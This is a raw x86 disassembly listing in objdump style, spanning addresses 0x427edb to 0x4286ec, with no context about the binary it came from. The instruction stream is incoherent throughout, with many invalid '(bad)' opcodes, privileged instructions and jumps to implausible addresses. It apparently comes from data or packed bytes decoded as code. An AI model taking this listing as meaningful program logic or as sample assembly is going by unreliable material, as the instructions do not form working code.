  427edb:	dec    ebp
  427edc:	jne    0x427f11
  427ede:	mov    eax,DWORD PTR [ebx]
  427ee0:	cld    
  427ee1:	loopne 0x427e93
  427ee3:	push   ebp
  427ee4:	add    DWORD PTR [eax+0x72851100],ecx
  427eea:	inc    DWORD PTR [eax]
  427eec:	inc    DWORD PTR [ebp-0x75]
  427eef:	mov    edi,esp
  427ef1:	lock add bl,0x1
  427ef5:	retf   
  427ef6:	add    dh,al
  427ef8:	xor    dh,cl
  427efa:	inc    ebp
  427efb:	scas   eax,DWORD PTR es:[edi]
  427efc:	mov    eax,DWORD PTR [ebx]
  427efe:	shl    al,0x0
  427f01:	inc    ebp
  427f02:	dec    DWORD PTR [ebx+0x4dccf0ff]
  427f08:	call   0x459140
  427f0d:	ud0    eax,ecx
  427f10:	adc    al,0x4d
  427f12:	inc    ebp
  427f13:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  427f19:	lock push 0x338055
  427f1f:	add    eax,DWORD PTR [eax]
  427f21:	ud0    ecx,edx
  427f24:	sbb    BYTE PTR [ebp+0x5e],dl
  427f27:	xor    ecx,ecx
  427f29:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  427f30:	push   ecx
  427f31:	add    BYTE PTR [ebp-0x38],cl
  427f34:	mov    DWORD PTR [esi-0x740004],eax
  427f3a:	cld    
  427f3b:	inc    ebp
  427f3c:	xchg   edx,eax
  427f3d:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  427f43:	xabort 0xaf
  427f46:	icebp  
  427f47:	mov    esi,DWORD PTR [ebp-0x28]
  427f4a:	(bad)  
  427f4b:	retf   
  427f4c:	or     ecx,eax
  427f4e:	(bad)  
  427f4f:	dec    ebp
  427f50:	pop    es
  427f51:	(bad)  
  427f52:	(bad)  
  427f53:	or     BYTE PTR [esi],al
  427f55:	jb     0x427f1d
  427f57:	add    BYTE PTR [ebx],al
  427f59:	inc    ebp
  427f5a:	(bad)  
  427f5b:	mov    ecx,DWORD PTR [edx]
  427f5d:	fadd   st(6),st
  427f5f:	ret    
  427f60:	add    ch,BYTE PTR [eax-0x37]
  427f63:	int    0x55
  427f65:	sub    ebp,esp
  427f67:	add    edx,DWORD PTR [ecx-0x14]
  427f6a:	inc    ebp
  427f6b:	inc    ebp
  427f6c:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  427f72:	cld    
  427f73:	(bad)  
  427f74:	mov    gs,WORD PTR [edi+0xf893be0]
  427f7a:	mov    ebp,ebp
  427f7c:	clc    
  427f7d:	push   eax
  427f7f:	push   DWORD PTR [ebp-0x4]
  427f82:	mov    BYTE PTR [ebp+0xa],0xff
  427f86:	(bad)  
  427f87:	int3   
  427f88:	or     BYTE PTR [eax],al
  427f8a:	(bad)  
  427f8b:	lea    eax,[edi]
  427f8d:	ins    BYTE PTR es:[edi],dx
  427f8e:	(bad)  
  427f8f:	inc    DWORD PTR [ecx]
  427f91:	push   eax
  427f92:	mov    BYTE PTR [ebp+0x9],0x8b
  427f96:	leave  
  427f97:	les    edx,FWORD PTR [ebp+0x0]
  427f9a:	in     al,dx
  427f9b:	call   DWORD PTR [ecx-0x75]
  427f9e:	inc    ebp
  427f9f:	cld    
  427fa0:	mov    DWORD PTR [eax+0x8b01fc],eax
  427fa6:	cld    
  427fa7:	xor    BYTE PTR [edi-0x76a8f98b],bh
  427fad:	std    
  427fae:	mov    eax,DWORD PTR [eax]
  427fb0:	clc    
  427fb1:	test   eax,esi
  427fb3:	je     0x42802a
  427fb5:	mov    eax,esi
  427fb7:	cld    
  427fb8:	add    al,0x80
  427fba:	add    WORD PTR [ecx+0x0],ax
  427fbe:	fadd   QWORD PTR [eax]
  427fc0:	mov    BYTE PTR [eax],0xd0
  427fc3:	push   0xffffffc3
  427fc5:	push   edi
  427fc6:	mov    edx,DWORD PTR [eax+0x51]
  427fc9:	pop    edi
  427fca:	lea    ebx,[ebx-0x8]
  427fcd:	ret    0x45
  427fd0:	mov    ecx,DWORD PTR [ebx-0x7241ae04]
  427fd6:	xchg   eax,edi
  427fd8:	mov    DWORD PTR [ebp-0x75],ecx
  427fdb:	push   esi
  427fdc:	clc    
  427fdd:	jne    0x427faf
  427fdf:	mov    ecx,0xf8450b0b
  427fe4:	(bad)  
  427fe5:	push   cs
  427fe6:	or     BYTE PTR [ebp-0x3a],dh
  427fe9:	cmp    eax,DWORD PTR [ecx]
  427feb:	pop    esi
  427fec:	(bad)  
  427fed:	or     al,0x5
  427fef:	inc    eax
  427ff0:	leave  
  427ff1:	in     al,dx
  427ff2:	add    al,0x42
  427ff4:	push   esi
  427ff5:	and    eax,0xedc940cf
  427ffa:	inc    DWORD PTR [eax-0x75]
  427ffd:	fmul   QWORD PTR [ebx-0xf8739be]
  428003:	inc    eax
  428004:	nop
  428005:	jmp    0x518b:0x8b8bc3ff
  42800c:	(bad)  
  42800d:	lea    eax,ds:0xff45e8f8
  428013:	push   esi
  428014:	push   DWORD PTR [ebp-0x39]
  428017:	mov    eax,0x7edda46
  42801c:	or     al,0x6
  42801e:	push   DWORD PTR [ebp-0x3a]
  428021:	cmp    eax,DWORD PTR [edx]
  428023:	pop    esi
  428024:	ret    
  428025:	or     al,0x56
  428027:	inc    ecx
  428028:	push   ebp
  428029:	js     0x428017
  42802b:	inc    edx
  42802c:	inc    ebp
  42802d:	int    0x1
  42802f:	inc    ecx
  428030:	sub    BYTE PTR ds:0xe77541fc,ah
  428036:	add    DWORD PTR [edx+0x1c],eax
  428039:	int3   
  42803a:	mov    eax,ebx
  42803c:	adc    al,0x8b
  42803e:	xchg   edx,eax
  42803f:	push   ecx
  428040:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  428046:	rcl    DWORD PTR [esi-0x9],cl
  428049:	jne    0x42809b
  42804b:	mov    eax,0x7c80ece
  428050:	rol    DWORD PTR [esi],cl
  428052:	div    DWORD PTR [ebp+0x50]
  428055:	cmp    ecx,edx
  428057:	pop    esi
  428058:	dec    BYTE PTR [edx]
  42805a:	in     al,dx
  42805b:	inc    edx
  42805c:	sub    ebp,ecx
  42805e:	inc    eax
  42805f:	(bad)  
  428060:	push   eax
  428061:	add    edx,DWORD PTR [eax-0x17]
  428064:	push   edi
  428065:	add    dh,dh
  428067:	leave  
  428068:	adc    DWORD PTR [ebp-0x1],0xffffffec
  42806c:	add    BYTE PTR [ecx+0x0],dl
  42806f:	inc    ebp
  428070:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  428076:	add    BYTE PTR [eax-0x7fbf448],bh
  42807c:	add    al,0x2
  42807e:	jmp    0x57e2bd8
  428083:	jne    0x42806d
  428085:	mov    eax,DWORD PTR [edx]
  428087:	or     BYTE PTR [eax],al
  428089:	inc    ecx
  42808a:	stc    
  42808b:	in     eax,dx
  42808c:	ss inc eax
  42808e:	aas    
  42808f:	out    0x7d,eax
  428091:	inc    ecx
  428092:	mov    esi,ecx
  428094:	lock ret 0x7d
  428098:	and    ecx,DWORD PTR [ebx-0x171777]
  42809e:	add    bh,bh
  4280a0:	aad    0xd7
  4280a2:	add    dh,cl
  4280a4:	clts   
  4280a6:	(bad)  
  4280a7:	call   0xffcd7fac
  4280ac:	hlt    
  4280ad:	iret   
  4280ae:	jge    0x428086
  4280b0:	rol    DWORD PTR [esi-0x80],cl
  4280b3:	icebp  
  4280b4:	or     BYTE PTR [edi-0x27],cl
  4280b7:	(bad)  
  4280b8:	out    dx,al
  4280b9:	mov    eax,DWORD PTR [ebx]
  4280bb:	(bad)  
  4280bc:	pop    esi
  4280bd:	push   es
  4280be:	cmp    al,0xe8
  4280c0:	sar    edi,0x8
  4280c3:	inc    DWORD PTR [edi]
  4280c5:	inc    esi
  4280c6:	(bad)  
  4280c7:	jmp    0x8b00:0x530e577e
  4280ce:	push   esi
  4280cf:	mov    eax,DWORD PTR [eax]
  4280d1:	and    al,0x0
  4280d3:	inc    ebp
  4280d4:	push   eax
  4280d5:	push   eax
  4280d6:	add    DWORD PTR [ebx+0x757d1834],ecx
  4280dc:	sub    edx,DWORD PTR [esi-0x24]
  4280df:	jne    0x428097
  4280e1:	lods   eax,DWORD PTR ds:[esi]
  4280e2:	mov    edx,DWORD PTR [edx-0x34]
  4280e5:	dec    esi
  4280e6:	out    0x83,eax
  4280e8:	into   
  4280e9:	push   edi
  4280eb:	loopne 0x4280bb
  4280ed:	shr    BYTE PTR [edx+ecx*4+0x0],1
  4280f1:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  4280f8:	rol    DWORD PTR [edx],0x8
  4280fb:	mov    esp,ecx
  4280fd:	cmp    DWORD PTR [ebx],0xc
  428100:	mov    esi,0x5001c0
  428105:	push   eax
  428106:	push   cs
  428107:	push   eax
  428108:	(bad)  
  428109:	sub    edx,edi
  42810b:	push   esi
  42810c:	adc    al,0xcb
  42810e:	ins    DWORD PTR es:[edi],dx
  42810f:	mov    eax,0x203e8
  428114:	add    al,ah
  428116:	ror    BYTE PTR [eax+0xc007c0],0xc0
  42811d:	add    dh,al
  42811f:	add    ah,ch
  428121:	rol    DWORD PTR [ebx-0x3595fb0d],1
  428127:	pop    ecx
  428128:	or     eax,ebx
  42812a:	cli    
  42812b:	add    BYTE PTR [ecx-0x4e728d1e],dh
  428131:	lea    ebp,[ebx]
  428133:	mov    edx,DWORD PTR [edx-0x4]
  428136:	dec    ecx
  428137:	inc    ebp
  428138:	shr    BYTE PTR [ebx],0x4b
  42813b:	and    al,0x0
  42813d:	(bad)  
  42813e:	jne    0x428185
  428140:	pop    eax
  428141:	mov    al,0x5a
  428143:	call   0x14183a2
  428148:	and    al,0x85
  42814a:	push   edx
  42814b:	add    BYTE PTR [eax+eax*1+0x0],ah
  42814f:	dec    ebp
  428150:	mov    cl,0x23
  428152:	jmp    0x428140
  428154:	mov    al,0xe7
  428156:	call   0x1388444
  42815b:	shr    DWORD PTR [eax+ebx*2],cl
  42815e:	lock (bad) 
  428160:	adc    eax,0x757f008d
  428165:	out    0x58,eax
  428167:	cmp    al,0x7
  428169:	pop    edx
  42816a:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  428171:	push   ecx
  428172:	cld    
  428173:	mov    esi,0x3b0175
  428178:	and    al,0xb0
  42817a:	xor    BYTE PTR [edx+0x1],0x8b
  42817e:	add    ah,bh
  428180:	mov    edi,DWORD PTR [ebp-0x4]
  428183:	psubsw mm7,QWORD PTR [edi]
  428186:	add    DWORD PTR [ebp+0x0],ebp
  428189:	rcr    eax,1
  42818b:	mov    edi,ecx
  42818d:	and    eax,DWORD PTR [eax]
  42818f:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  428195:	call   0x12f847e
  42819a:	add    al,cl
  42819c:	mov    ebp,esi
  42819e:	aam    0x83
  4281a0:	or     DWORD PTR [ecx],eax
  4281a2:	jne    0x428195
  4281a4:	mov    eax,DWORD PTR [eax]
  4281a6:	aam    0x0
  4281a8:	dec    ebp
  4281a9:	jne    0x428136
  4281ab:	cmp    ebx,eax
  4281ad:	jb     0x4281fc
  4281af:	jmp    0x42813c
  4281b1:	mov    ebx,esp
  4281b3:	int3   
  4281b4:	dec    ebp
  4281b5:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  4281bc:	mov    edx,0x8b0a8b
  4281c1:	cmp    ecx,DWORD PTR [eax]
  4281c3:	jb     0x42819c
  4281c5:	pop    edx
  4281c6:	push   edi
  4281c7:	cli    
  4281c8:	pop    es
  4281c9:	mov    eax,ecx
  4281cb:	jb     0x4281cf
  4281cd:	add    DWORD PTR [ebx],0xa
  4281d0:	mov    eax,DWORD PTR [ebx]
  4281d2:	int3   
  4281d3:	add    bh,BYTE PTR [esi+0x75d10006]
  4281d9:	jmp    0x428166
  4281db:	mov    al,0xe8
  4281dd:	call   0x103845f
  4281e2:	add    edx,DWORD PTR [ecx+ecx*8]
  4281e5:	pop    edi
  4281e6:	or     BYTE PTR [ecx-0x73],bl
  4281e9:	pop    ecx
  4281ea:	inc    edi
  4281eb:	xor    al,0xeb
  4281ed:	push   ecx
  4281ee:	mov    edi,DWORD PTR [edx+0xc506cc]
  4281f4:	call   0xb182f9
  4281f9:	int3   
  4281fa:	sbb    BYTE PTR [esi],ch
  4281fc:	inc    ebp
  4281fd:	add    BYTE PTR [ebx-0x1f4f338b],cl
  428203:	call   0x9b8472
  428208:	or     BYTE PTR [ebx-0x73],dl
  42820b:	cmp    al,0x47
  42820d:	mov    al,0x1
  42820f:	jb     0x428211
  428211:	mov    al,0x10
  428213:	push   eax
  428214:	add    al,0x75
  428216:	add    BYTE PTR [ebx],ch
  428218:	add    ebx,esp
  42821a:	int3   
  42821b:	jne    0x42822d
  42821d:	movsx  edx,cl
  428220:	add    DWORD PTR [eax],eax
  428222:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  428229:	mov    gs,edi
  42822b:	add    BYTE PTR [eax-0x50],ch
  42822e:	add    al,ch
  428230:	mov    eax,DWORD PTR [ecx]
  428232:	sub    eax,DWORD PTR [eax]
  428234:	jb     0x4282ab
  428236:	add    DWORD PTR [esp+eiz*8-0x50],esi
  42823a:	jge    0x428224
  42823c:	add    al,0x1
  42823e:	add    DWORD PTR [eax],0x0
  428241:	jne    0x428243
  428243:	je     0x42828a
  428245:	mov    eax,DWORD PTR [edi]
  428247:	ror    BYTE PTR [ebp+0x4d],1
  42824a:	or     DWORD PTR [ecx+0x4d03d004],0x3
  428251:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  428257:	mov    DWORD PTR [ebx],ebp
  428259:	fadd   DWORD PTR [eax+0x75]
  42825c:	inc    eax
  42825d:	pop    eax
  42825e:	lea    ebx,[ecx+0x4f]
  428261:	push   0xb1000003
  428266:	out    dx,eax
  428267:	add    ebp,DWORD PTR [edx+edx*2]
  42826a:	add    BYTE PTR [ebx+ecx*4],bh
  42826d:	mov    ch,BYTE PTR [ebx]
  42826f:	jb     0x4282e3
  428271:	add    al,0x89
  428273:	push   eax
  428274:	call   0x842acfe6
  428279:	add    DWORD PTR [eax+eax*1],eax
  42827c:	jae    0x428292
  42827e:	icebp  
  42827f:	inc    ebp
  428280:	mov    eax,DWORD PTR gs:[ecx]
  428283:	int3   
  428284:	out    dx,al
  428285:	loopne 0x4282d4
  428287:	sub    eax,DWORD PTR [edx]
  428289:	push   0xffffff83
  42828b:	pop    esi
  42828c:	push   cs
  42828d:	jl     0x4282a8
  42828f:	add    al,0xaf
  428291:	xor    eax,0x832b6d00
  428296:	mov    eax,DWORD PTR [edx]
  428298:	rcr    BYTE PTR [ebp+0x754500dc],cl
  42829e:	ror    DWORD PTR [ebx+0x7dc8e803],1
  4282a4:	inc    ebp
  4282a5:	shr    ebx,0x3
  4282a8:	or     DWORD PTR [eax],0x4
  4282ab:	push   0xffffffa5
  4282ad:	pop    esi
  4282ae:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  4282b5:	jmp    0x428314
  4282b7:	mov    edi,0xff0272
  4282bc:	fdivr  QWORD PTR [ebp+0x5d]
  4282bf:	push   0x4e
  4282c1:	pop    ecx
  4282c2:	call   0x42c6c7
  4282c7:	mov    DWORD PTR [ebx],eax
  4282c9:	in     al,0xc8
  4282cb:	rol    BYTE PTR [ebp-0x75],0xc1
  4282cf:	call   0xac84b0
  4282d4:	pop    esi
  4282d5:	enter  0xceff,0x8b
  4282d9:	repz mov ecx,DWORD PTR [ebp-0x34]
  4282dd:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  4282e4:	je     0x4282e6
  4282e6:	or     DWORD PTR [ebx-0x74183b24],eax
  4282ec:	jne    0x4282d2
  4282ee:	jmp    0x4282e9
  4282f0:	push   DWORD PTR [edx-0x24]
  4282f3:	push   0x4d
  4282f5:	pop    ecx
  4282f6:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  4282fa:	jge    0x428302
  4282fc:	mov    eax,eax
  4282fe:	sub    ebp,DWORD PTR [edx+0x24]
  428301:	pop    esi
  428302:	inc    ebp
  428303:	mov    esp,0x8b6077
  428308:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  42830e:	lods   al,BYTE PTR ds:[esi]
  42830f:	add    BYTE PTR [ebx],bh
  428311:	enter  0xce73,0x49
  428315:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  42831d:	stc    
  42831e:	jge    0x428392
  428320:	jnp    0xdd42068f
  428326:	call   0xc583fc
  42832b:	fadd   st(0),st
  42832d:	dec    esi
  42832e:	ins    BYTE PTR es:[edi],dx
  42832f:	stc    
  428330:	cmp    al,0x73
  428332:	push   ebp
  428333:	mov    eax,0xf8028b
  428338:	jne    0x4282fb
  42833a:	mov    esi,ecx
  42833c:	mov    esp,DWORD PTR [ebp+0x2c]
  42833f:	add    edi,DWORD PTR [ebp-0x24]
  428342:	sub    esp,eax
  428344:	and    al,0x45
  428346:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  42834c:	sbb    al,0xee
  42834e:	pop    esi
  42834f:	call   0x82837f
  428354:	fsubr  st,st(3)
  428356:	sti    
  428357:	add    BYTE PTR gs:[ecx],bh
  42835a:	add    eax,esp
  42835c:	add    DWORD PTR [esi],eax
  42835e:	rol    DWORD PTR [ebp+0x8],0x29
  428362:	mov    esp,eax
  428364:	clc    
  428365:	jne    0x4283dc
  428367:	mov    eax,0x8b0673
  42836c:	loopne 0x4283b3
  42836e:	loopne 0x4282f9
  428370:	lods   al,BYTE PTR ds:[esi]
  428371:	int3   
  428372:	inc    ebp
  428373:	mov    DWORD PTR gs:[eax+edi*8],eax
  428377:	add    al,0xc3
  428379:	sub    ecx,DWORD PTR [ebp+0x47]
  42837c:	(bad)  
  42837e:	shr    BYTE PTR [ebp-0x1f],0xe8
  428382:	add    eax,DWORD PTR [eax]
  428384:	call   0x6444489
  428389:	add    esi,DWORD PTR [esi-0x3b2efc83]
  42838f:	dec    esi
  428390:	ins    DWORD PTR es:[edi],dx
  428391:	in     al,dx
  428392:	lea    eax,[eax]
  428394:	inc    ebp
  428395:	inc    ebp
  428396:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  42839c:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4283a6:	and    al,0xdc
  4283a8:	ror    DWORD PTR [edx+0x24],0xf7
  4283ac:	or     BYTE PTR [ebp+0x4c],dh
  4283af:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  4283b3:	stos   BYTE PTR es:[edi],al
  4283b4:	adc    edx,edi
  4283b6:	inc    esp
  4283b7:	add    edi,DWORD PTR [eax]
  4283b9:	jne    0x42839e
  4283bb:	mov    DWORD PTR [eax-0x7449db04],ecx
  4283c1:	cmp    ecx,DWORD PTR [edi]
  4283c3:	sub    BYTE PTR [ebp-0x7e],dl
  4283c6:	sar    ebp,0xb
  4283c9:	jmp    FWORD PTR [edi+0x2400392a]
  4283cf:	sub    esi,DWORD PTR [ebx-0x73]
  4283d2:	mov    esp,DWORD PTR [ecx+edi*4]
  4283d5:	mov    ecx,DWORD PTR [eax]
  4283d7:	and    BYTE PTR [eax],al
  4283d9:	jne    0x4283a5
  4283db:	sub    ebp,ecx
  4283dd:	sbb    BYTE PTR [esi+0x32],ah
  4283e0:	dec    ebp
  4283e1:	push   ebp
  4283e2:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  4283e8:	ret    
  4283e9:	mov    edx,ebp
  4283eb:	leave  
  4283ec:	sub    DWORD PTR [esi+0x24],ebx
  4283ef:	ret    0x2b
  4283f2:	pop    ax
  4283f4:	push   ebp
  4283f5:	rol    BYTE PTR [ebx],0xeb
  4283f8:	add    DWORD PTR [ecx+0x6c0001],0x40
  4283ff:	jb     0x428456
  428401:	ret    
  428402:	in     al,dx
  428403:	jecxz  0x428390
  428405:	push   esi
  428406:	xchg   esp,eax
  428407:	jne    0x428409
  428409:	cmp    edx,DWORD PTR [esi+0x1c]
  42840c:	jne    0x4283f2
  42840e:	mov    eax,DWORD PTR [ebp-0x77]
  428411:	ror    DWORD PTR [ebx+0x899408],0xe0
  428418:	mov    esi,DWORD PTR [ebp-0x75]
  42841b:	pop    esi
  42841c:	nop
  42841d:	mov    eax,DWORD PTR [eax]
  42841f:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  428425:	add    al,0x0
  428427:	inc    ebp
  428428:	mov    eax,DWORD PTR [ebx]
  42842a:	mov    ebp,ebx
  42842c:	cmp    al,0xf
  42842e:	or     al,al
  428430:	inc    ebp
  428431:	inc    ebp
  428432:	cmp    BYTE PTR [ebx+0x6c8bc89c],cl
  428438:	cld    
  428439:	add    BYTE PTR [edi+0x506c16c0],dh
  42843f:	add    BYTE PTR [ecx-0x5],dl
  428442:	add    eax,0x17200
  428447:	sbb    al,0x85
  428449:	dec    esp
  42844a:	je     0x428484
  42844c:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  428450:	add    BYTE PTR [ebx],bh
  428452:	(bad)  
  428453:	and    al,0x39
  428455:	jae    0x4283f3
  428457:	mov    cl,cl
  428459:	inc    DWORD PTR [esp]
  42845c:	push   ebp
  42845d:	shr    esp,0x8
  428460:	in     al,dx
  428461:	push   esp
  428462:	add    DWORD PTR [eax],esp
  428464:	add    bl,cl
  428466:	inc    ebp
  428467:	mov    bh,0x89
  428469:	add    ah,bh
  42846b:	jmp    0xca7b93b5
  428470:	pushf  
  428471:	dec    esp
  428472:	mov    edx,0xf8178520
  428477:	fst    DWORD PTR [ebp+0x0]
  42847a:	mov    BYTE PTR [eax],0xc4
  42847d:	sub    edx,DWORD PTR [ebx-0x3f]
  428480:	inc    ebp
  428481:	add    eax,0xc601dc
  428486:	mov    al,0xc6
  428489:	ins    BYTE PTR es:[edi],dx
  42848a:	mov    DWORD PTR [eax+0x57],0x2e0545c1
  428491:	dec    esp
  428492:	jmp    DWORD PTR [eax]
  428494:	inc    ebp
  428495:	fnstcw WORD PTR [eax+0x29]
  428498:	test   BYTE PTR [eax],0xc5
  42849b:	rol    BYTE PTR [eax],0xc0
  42849e:	lea    ecx,[ebp-0x3cf0dbcb]
  4284a4:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  4284aa:	inc    esi
  4284ab:	add    DWORD PTR [eax],ebx
  4284ad:	add    dh,bh
  4284af:	mov    esi,DWORD PTR [edx+0x8]
  4284b2:	(bad)  
  4284b3:	fdiv   QWORD PTR ss:[ecx]
  4284b6:	(bad)  
  4284b7:	mov    bl,ch
  4284b9:	add    esi,eax
  4284bb:	add    dh,bl
  4284bd:	or     esi,eax
  4284bf:	mov    dl,0xdf
  4284c1:	add    esi,eax
  4284c3:	add    al,ah
  4284c5:	push   cs
  4284c6:	mov    BYTE PTR [edx+0xc601e1],0xe2
  4284cd:	or     BYTE PTR [ebx],dh
  4284cf:	dec    ecx
  4284d0:	lea    eax,[ebx]
  4284d2:	xor    eax,0x18fc0fc7
  4284d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284d8:	repz clc 
  4284da:	add    eax,DWORD PTR [ebp+0x46]
  4284dd:	prefetcht0 BYTE PTR [ecx-0x2]
  4284e1:	xor    eax,0x7c60872
  4284e6:	mov    esp,0xbd32c698
  4284eb:	pop    esi
  4284ec:	mov    cl,0xbe
  4284ef:	or     al,0xc6
  4284f1:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  4284f8:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  4284ff:	add    dh,al
  428501:	mov    eax,ebx
  428503:	xor    DWORD PTR [ebx],0x35008dbc
  428509:	mov    ecx,DWORD PTR [edi]
  42850b:	sbb    al,0x18
  42850d:	inc    ebp
  42850e:	xrelease mov DWORD PTR [ebx],0x188546f4
  428515:	clc    
  428516:	(bad)  
  428517:	cmp    BYTE PTR [edx-0x64],dh
  42851a:	lea    ecx,[ecx+0x45ffe838]
  428520:	mov    ecx,esp
  428522:	fadd   st,st(6)
  428524:	dec    ebp
  428525:	lds    edi,FWORD PTR [eax+0x7145fc56]
  42852b:	out    0x1,eax
  42852d:	inc    ebp
  42852e:	lea    ebp,ds:0xc8ffc6ff
  428534:	enter  0xa33,0xc6
  428538:	push   ebp
  428539:	leave  
  42853a:	(bad)  
  42853b:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  428541:	add    BYTE PTR [ebp+0x44],al
  428544:	mov    eax,esp
  428546:	mov    WORD PTR [esi+0x43398300],?
  42854c:	psubusw mm4,QWORD PTR [eax-0x78]
  428550:	add    BYTE PTR [ebx-0x1303f975],al
  428556:	add    BYTE PTR [ebp+0x1],0xf3
  42855a:	add    BYTE PTR [ebp+0x38],al
  42855d:	in     eax,dx
  42855e:	inc    ebp
  42855f:	inc    ebp
  428560:	mov    esp,ebx
  428562:	add    BYTE PTR [ebp+0x0],0xee
  428566:	mov    DWORD PTR [ebp-0x48],eax
  428569:	sub    eax,0x2e00454f
  42856e:	js     0x4285b5
  428570:	data16 js 0x4284f8
  428573:	idiv   bh
  428575:	inc    esp
  428576:	(bad)  
  428577:	fadd   st(7),st
  428579:	mov    dh,0x89
  42857b:	and    DWORD PTR [esi+0x43],0xffffffff
  42857f:	fld    DWORD PTR [ebx-0x767cc078]
  428585:	pop    es
  428586:	push   0x8d45ffec
  42858b:	in     eax,dx
  42858c:	inc    DWORD PTR [ebp-0x77]
  42858f:	loopne 0x4285fb
  428591:	inc    ebp
  428592:	jmp    esp
  428594:	add    DWORD PTR [ebp+0x11],0xfffffff1
  428598:	mov    DWORD PTR [ebp+0x6c],eax
  42859b:	(bad)  
  42859d:	inc    ebp
  42859e:	(bad)  
  42859f:	call   0xe7cbcab0
  4285a4:	outs   dx,BYTE PTR ds:[esi]
  4285a5:	inc    ebp
  4285a6:	(bad)  
  4285a7:	js     0x42852c
  4285a9:	div    BYTE PTR ds:0x70bc8944
  4285af:	mov    dh,0xff
  4285b1:	or     DWORD PTR [ebp-0x7626f5bd],0xffffff88
  4285b8:	jb     0x42853d
  4285ba:	dec    DWORD PTR [eax]
  4285bc:	mov    ebp,esp
  4285be:	test   WORD PTR [ebp-0x1],ax
  4285c5:	inc    ebp
  4285c6:	ror    BYTE PTR [ebx-0x117a279a],0xff
  4285cd:	adc    edi,edi
  4285cf:	mov    ecx,esi
  4285d1:	mov    eax,DWORD PTR [eax]
  4285d3:	cmp    BYTE PTR [esi-0x1],ah
  4285d6:	test   DWORD PTR [ebx],edi
  4285d8:	push   DWORD PTR [ebp-0x1]
  4285db:	mov    DWORD PTR [esi-0x48],ebp
  4285de:	add    BYTE PTR [ebp+0x66],al
  4285e1:	jmp    0x428568
  4285e3:	pushf  
  4285e4:	dec    DWORD PTR [ebx-0x7f9c0301]
  4285ea:	add    BYTE PTR [ecx],al
  4285ec:	data16 add BYTE PTR [ebp-0x7a00c8],al
  4285f3:	add    al,al
  4285f5:	add    BYTE PTR [esi+0x45],ah
  4285f8:	test   DWORD PTR [ebx+0xff7cff],ecx
  4285fe:	dec    esp
  4285ff:	mov    DWORD PTR [eax],eax
  428601:	mov    esp,DWORD PTR [esi-0x4]
  428604:	inc    ebp
  428605:	cmp    BYTE PTR [eax+0x4701],0x38
  42860c:	mov    DWORD PTR [ecx-0x7e],esp
  42860f:	add    BYTE PTR [edi-0x73],al
  428612:	push   0xffffffd1
  428614:	mov    WORD PTR [ebp+0x64],ax
  428618:	(bad)  
  428619:	call   eax
  42861b:	mov    esp,eax
  42861d:	data16 icebp 
  42861f:	test   DWORD PTR [ebp-0x1],eax
  428622:	(bad)  
  428624:	out    0xc0,eax
  428626:	lea    esp,[esi-0x30]
  428629:	test   DWORD PTR [edx+0x43ff80ff],ecx
  42862f:	inc    edi
  428630:	jmp    0x75ff:0x40858866
  428637:	dec    DWORD PTR [ebp-0x7a992f40]
  42863d:	test   esi,edi
  42863f:	(bad)  
  428640:	(bad)  
  428641:	inc    DWORD PTR [ebp-0x9901b9]
  428647:	test   DWORD PTR [ebx+0x50fff4ff],ecx
  42864d:	rcl    BYTE PTR [ecx+0x66],0x33
  428651:	test   DWORD PTR [ebx+0xff72ff],edi
  428657:	inc    edi
  428658:	ret    
  428659:	mov    ax,WORD PTR [ebp-0x3f0004]
  428660:	push   eax
  428661:	mov    DWORD PTR [ebp-0x77],0xff98748b
  428668:	add    BYTE PTR [ebx-0x764ff439],al
  42866e:	push   DWORD PTR [esi+0x1]
  428671:	inc    DWORD PTR [eax]
  428673:	mov    eax,0xff99ff
  428678:	or     BYTE PTR [ecx-0x7a87bb],cl
  42867e:	jne    0x428638
  428680:	add    DWORD PTR [edx-0x76edff72],0xff707a8d
  42868a:	mov    ecx,0xd74fb8
  42868f:	add    cl,al
  428691:	mov    DWORD PTR [ecx-0x3f007784],ecx
  428697:	or     DWORD PTR [ebx+0x558966ec],0x7e
  42869e:	(bad)  
  42869f:	push   ebp
  4286a1:	mov    eax,0x8c2789
  4286a6:	ret    0x6689
  4286a9:	adc    BYTE PTR [ebp+0x4c],0x8d
  4286ad:	add    bl,bl
  4286af:	mov    WORD PTR [ebp-0x70],ax
  4286b3:	(bad)  
  4286b4:	ret    0x660d
  4286b7:	or     BYTE PTR [ebp-0x77],dl
  4286ba:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  4286c1:	in     al,0x89
  4286c3:	(bad)  
  4286c4:	xchg   esi,eax
  4286c5:	aam    0xcf
  4286c7:	call   0x45daff55
  4286cc:	dec    edx
  4286cd:	pop    ecx
  4286ce:	mov    edx,DWORD PTR [eax]
  4286d0:	repnz push bp
  4286d3:	or     BYTE PTR [ebx+0x5510663b],0x49
  4286da:	(bad)  
  4286db:	repnz xor eax,0xa0898945
  4286e1:	mov    ah,0x89
  4286e3:	jmp    DWORD PTR [edx+0x66b0418d]
  4286e9:	inc    DWORD PTR [ebp+0x50]
  4286ec:	add    DWORD PTR [ebp-0x5],0xffffffbe
